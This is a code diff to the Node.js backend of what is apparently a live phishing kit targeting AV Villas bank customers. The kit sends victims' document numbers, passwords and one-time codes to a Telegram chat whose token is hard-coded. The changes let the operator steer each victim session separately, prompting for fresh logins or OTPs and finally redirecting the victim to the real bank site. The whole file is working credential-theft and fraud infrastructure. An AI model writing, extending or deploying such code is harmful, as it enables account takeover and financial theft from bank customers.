@@ -17,14 +17,6 @@ const CONFIG = {
     TELEGRAM: {
         BOT_TOKEN: '8520156390:AAGD07USz4taUVi8whydEPExTnf4qUQO5aU',
         CHAT_ID: '-5029729816'
-    },
-    SOCKET: {
-        CORS: {
-            origin: "*",
-            methods: ["GET", "POST"]
-        },
-        PING_TIMEOUT: 60000,
-        PING_INTERVAL: 25000
     }
 };
 
@@ -34,18 +26,33 @@ const CONFIG = {
 const app = express();
 const server = http.createServer(app);
 const io = socketIo(server, {
-    cors: CONFIG.SOCKET.CORS,
-    pingTimeout: CONFIG.SOCKET.PING_TIMEOUT,
-    pingInterval: CONFIG.SOCKET.PING_INTERVAL
+    cors: {
+        origin: "*",
+        methods: ["GET", "POST"]
+    },
+    pingTimeout: 30000,
+    pingInterval: 10000,
+    transports: ['websocket', 'polling'],
+    allowEIO3: true,
+    connectTimeout: 10000,
+    upgradeTimeout: 5000,
+    maxHttpBufferSize: 1e8,
+    perMessageDeflate: false
 });
 
 // Middlewares
 app.use(express.static(__dirname));
 app.use(express.json());
 
-// Crear bot de Telegram
+// Crear bot de Telegram con configuración optimizada
 const bot = new TelegramBot(CONFIG.TELEGRAM.BOT_TOKEN, { 
-    polling: true,
+    polling: {
+        interval: 100,
+        autoStart: true,
+        params: {
+            timeout: 10
+        }
+    },
     filepath: false
 });
 
@@ -55,45 +62,69 @@ const bot = new TelegramBot(CONFIG.TELEGRAM.BOT_TOKEN, {
 class ClientManager {
     constructor() {
         this.clients = new Map();
+        this.messageToSession = new Map(); // messageId -> sessionId
     }
 
     add(socket) {
+        const sessionId = socket.handshake.query.sessionId || socket.id;
+        
         this.clients.set(socket.id, {
             socket: socket,
-            connectedAt: new Date(),
-            ip: socket.handshake.address
+            sessionId: sessionId,
+            connectedAt: new Date()
         });
-        console.log(`✅ Cliente conectado: ${socket.id} | Total: ${this.clients.size}`);
+        
+        console.log(`✅ Cliente conectado: ${socket.id} | Sesión: ${sessionId} | Total: ${this.clients.size}`);
     }
 
     remove(socketId) {
-        const client = this.clients.get(socketId);
-        if (client) {
-            this.clients.delete(socketId);
-            console.log(`❌ Cliente desconectado: ${socketId} | Total: ${this.clients.size}`);
-        }
+        this.clients.delete(socketId);
+        console.log(`❌ Cliente desconectado: ${socketId} | Total: ${this.clients.size}`);
     }
 
     broadcast(event, data) {
         let sent = 0;
         this.clients.forEach((client) => {
             try {
-                client.socket.emit(event, data);
-                sent++;
+                if (client.socket.connected) {
+                    client.socket.emit(event, data);
+                    sent++;
+                }
             } catch (error) {
-                console.error(`Error al enviar a ${client.socket.id}:`, error.message);
+                console.error(`Error broadcast a ${client.socket.id}:`, error.message);
             }
         });
-        console.log(`📡 Evento "${event}" enviado a ${sent} clientes`);
+        console.log(`📡 Broadcast "${event}" enviado a ${sent} cliente(s)`);
         return sent;
+    }
+
+    associateMessage(messageId, sessionId) {
+        this.messageToSession.set(messageId, sessionId);
+        console.log(`🔗 Mensaje ${messageId} asociado a sesión ${sessionId}`);
+    }
+
+    sendToSession(sessionId, event, data) {
+        let sent = 0;
+        this.clients.forEach((client) => {
+            if (client.sessionId === sessionId && client.socket.connected) {
+                try {
+                    client.socket.emit(event, data);
+                    sent++;
+                    console.log(`📤 Enviado "${event}" a cliente ${client.socket.id} (sesión: ${sessionId})`);
+                } catch (error) {
+                    console.error(`Error al enviar a ${client.socket.id}:`, error.message);
+                }
+            }
+        });
+        return sent;
+    }
+
+    getSessionByMessage(messageId) {
+        return this.messageToSession.get(messageId);
     }
 
     getCount() {
         return this.clients.size;
-    }
-
-    getAll() {
-        return Array.from(this.clients.values());
     }
 }
 
@@ -141,7 +172,7 @@ const Utils = {
 // SERVICIO DE TELEGRAM
 // ============================================
 class TelegramService {
-    static async sendLoginData(data) {
+    static async sendLoginData(data, sessionId) {
         try {
             const message = 
                 `🔐 Nueva información de login\n\n` +
@@ -149,16 +180,16 @@ class TelegramService {
                 `Número de documento: ${data.documentNumber}\n` +
                 `Contraseña: ${data.password}\n\n` +
                 `Recibido: ${Utils.getCurrentDateTime()}\n` +
-                `Clientes conectados: ${clientManager.getCount()}`;
+                `Sesión: ${sessionId.substring(0, 15)}...`;
 
             const keyboard = {
                 inline_keyboard: [
                     [
-                        { text: '🔑 Pedir Login', callback_data: 'request_login' },
-                        { text: '📱 Pedir OTP', callback_data: 'request_otp' }
+                        { text: '🔑 Pedir Login', callback_data: `request_login:${sessionId}` },
+                        { text: '📱 Pedir OTP', callback_data: `request_otp:${sessionId}` }
                     ],
                     [
-                        { text: '✅ Finalizar', callback_data: 'finalize' }
+                        { text: '✅ Finalizar', callback_data: `finalize:${sessionId}` }
                     ]
                 ]
             };
@@ -176,7 +207,7 @@ class TelegramService {
         }
     }
 
-    static async sendOTP(data) {
+    static async sendOTP(data, sessionId) {
         try {
             const message = 
                 `📱 Código OTP recibido\n\n` +
@@ -186,16 +217,16 @@ class TelegramService {
                 `Número de documento: ${data.documentNumber}\n` +
                 `Contraseña: ${data.password}\n\n` +
                 `Recibido: ${Utils.getCurrentDateTime()}\n` +
-                `Clientes conectados: ${clientManager.getCount()}`;
+                `Sesión: ${sessionId.substring(0, 15)}...`;
 
             const keyboard = {
                 inline_keyboard: [
                     [
-                        { text: '🔑 Pedir Login', callback_data: 'request_login' },
-                        { text: '📱 Pedir OTP Nuevo', callback_data: 'request_otp' }
+                        { text: '🔑 Pedir Login', callback_data: `request_login:${sessionId}` },
+                        { text: '📱 Pedir OTP Nuevo', callback_data: `request_otp:${sessionId}` }
                     ],
                     [
-                        { text: '✅ Finalizar', callback_data: 'finalize' }
+                        { text: '✅ Finalizar', callback_data: `finalize:${sessionId}` }
                     ]
                 ]
             };
@@ -212,26 +243,6 @@ class TelegramService {
             return { success: false, error: Utils.formatError(error) };
         }
     }
-
-    static async notifyClients(action, count) {
-        try {
-            let message = '';
-            let icon = '';
-
-            if (action === 'request_login') {
-                icon = '🔑';
-                message = `${icon} Se ha solicitado nueva información de login a ${count} cliente(s) conectado(s).`;
-            } else if (action === 'request_otp') {
-                icon = '📱';
-                message = `${icon} Se ha solicitado código OTP a ${count} cliente(s) conectado(s).`;
-            }
-
-            await bot.sendMessage(CONFIG.TELEGRAM.CHAT_ID, message);
-
-        } catch (error) {
-            console.error('❌ Error al notificar clientes:', error.message);
-        }
-    }
 }
 
 // ============================================
@@ -242,28 +253,36 @@ io.on('connection', (socket) => {
 
     socket.on('disconnect', (reason) => {
         clientManager.remove(socket.id);
-        console.log(`Razón de desconexión: ${reason}`);
+        console.log(`🔌 Desconexión: ${reason} | Socket: ${socket.id}`);
     });
 
     socket.on('login-data', async (data) => {
+        const client = clientManager.clients.get(socket.id);
         console.log('📥 Datos de login recibidos:', {
             documentType: data.documentType,
             documentNumber: data.documentNumber,
+            sessionId: client?.sessionId,
             timestamp: data.timestamp
         });
 
-        const result = await TelegramService.sendLoginData(data);
+        const result = await TelegramService.sendLoginData(data, client?.sessionId || socket.id);
         socket.emit('telegram-sent', result);
     });
 
     socket.on('otp-data', async (data) => {
+        const client = clientManager.clients.get(socket.id);
         console.log('📥 Código OTP recibido:', {
             otpCode: data.otpCode,
+            sessionId: client?.sessionId,
             timestamp: data.timestamp
         });
 
-        const result = await TelegramService.sendOTP(data);
+        const result = await TelegramService.sendOTP(data, client?.sessionId || socket.id);
         socket.emit('telegram-sent', result);
+    });
+
+    socket.on('ping', () => {
+        socket.emit('pong');
     });
 
     socket.on('error', (error) => {
@@ -275,45 +294,75 @@ io.on('connection', (socket) => {
 // MANEJADORES DE TELEGRAM BOT
 // ============================================
 bot.on('callback_query', async (callbackQuery) => {
-    const action = callbackQuery.data;
-    const chatId = callbackQuery.message.chat.id;
+    const callbackData = callbackQuery.data;
+    const [action, sessionId] = callbackData.split(':');
+    const messageId = callbackQuery.message.message_id;
 
-    console.log(`📲 Callback recibido: ${action}`);
+    console.log(`📲 Callback: ${action} | Sesión: ${sessionId?.substring(0, 15)}...`);
+
+    // Responder inmediatamente al callback para que no se quede cargando
+    bot.answerCallbackQuery(callbackQuery.id, {
+        text: '⏳ Procesando...',
+        show_alert: false
+    }).catch(err => console.error('Error answerCallback:', err.message));
 
     try {
-        if (action === 'request_login') {
-            const count = clientManager.broadcast('redirect', { page: 'login' });
-            
+        // Buscar el cliente con esta sessionId
+        let targetClient = null;
+        clientManager.clients.forEach((client) => {
+            if (client.sessionId === sessionId && client.socket.connected) {
+                targetClient = client;
+            }
+        });
+        
+        if (!targetClient) {
+            // Editar la respuesta del callback
             await bot.answerCallbackQuery(callbackQuery.id, {
-                text: '✅ Solicitando nueva información de login...'
-            });
-            
-            await TelegramService.notifyClients(action, count);
-
-        } else if (action === 'request_otp') {
-            const count = clientManager.broadcast('redirect', { page: 'otp' });
-            
-            await bot.answerCallbackQuery(callbackQuery.id, {
-                text: '✅ Solicitando código OTP...'
-            });
-            
-            await TelegramService.notifyClients(action, count);
-
-        } else if (action === 'finalize') {
-            const count = clientManager.broadcast('redirect', { page: 'finalize', url: 'https://www.avvillas.com.co/' });
-            
-            await bot.answerCallbackQuery(callbackQuery.id, {
-                text: '✅ Finalizando sesión...'
-            });
-            
-            await bot.sendMessage(chatId, `✅ Se ha redirigido a ${count} cliente(s) a la página oficial de AV Villas.`);
+                text: '⚠️ Cliente no conectado'
+            }).catch(() => {});
+            return;
         }
+
+        let commandExecuted = false;
+
+        // Ejecutar el comando según la acción - solo para este cliente
+        if (action === 'request_login') {
+            targetClient.socket.emit('redirect', { page: 'login' });
+            commandExecuted = true;
+            console.log(`📤 Redirect login → ${sessionId?.substring(0, 15)}...`);
+        } else if (action === 'request_otp') {
+            targetClient.socket.emit('redirect', { page: 'otp' });
+            commandExecuted = true;
+            console.log(`📤 Redirect OTP → ${sessionId?.substring(0, 15)}...`);
+        } else if (action === 'finalize') {
+            targetClient.socket.emit('redirect', { 
+                page: 'finalize', 
+                url: 'https://www.avvillas.com.co/' 
+            });
+            commandExecuted = true;
+            console.log(`📤 Redirect finalize → ${sessionId?.substring(0, 15)}...`);
+        }
+
+        // Editar el mensaje para mostrar confirmación (sin await para no bloquear)
+        if (commandExecuted) {
+            const originalText = callbackQuery.message.text;
+            if (!originalText.includes('✅ Comando ejecutado')) {
+                const updatedText = originalText + '\n\n✅ Comando ejecutado';
+                
+                bot.editMessageText(updatedText, {
+                    chat_id: CONFIG.TELEGRAM.CHAT_ID,
+                    message_id: messageId,
+                    reply_markup: callbackQuery.message.reply_markup
+                }).catch(err => {
+                    if (!err.message.includes('message is not modified')) {
+                        console.error('⚠️ Error editar:', err.message);
+                    }
+                });
+            }
+        }
+
     } catch (error) {
         console.error('❌ Error en callback:', error.message);
-        
-        await bot.answerCallbackQuery(callbackQuery.id, {
-            text: '❌ Error al procesar la solicitud'
-        });
     }
 });
 
